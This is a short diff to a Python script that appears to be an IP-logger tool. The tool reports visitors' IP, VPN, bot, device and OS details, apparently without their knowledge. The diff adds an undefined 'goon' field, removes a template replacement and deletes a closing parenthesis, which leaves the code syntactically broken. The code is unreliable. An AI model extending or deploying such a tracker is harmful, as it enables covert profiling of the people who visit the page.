@@ -162,6 +162,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **goon:** `{info['goon']}`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -254,8 +255,7 @@ height: 100vh;
                     message = message.replace("{vpn}", str(result["proxy"]))
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = message.replace("{random}", result["regionName"])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0]
 
                 datatype = 'text/html'
 
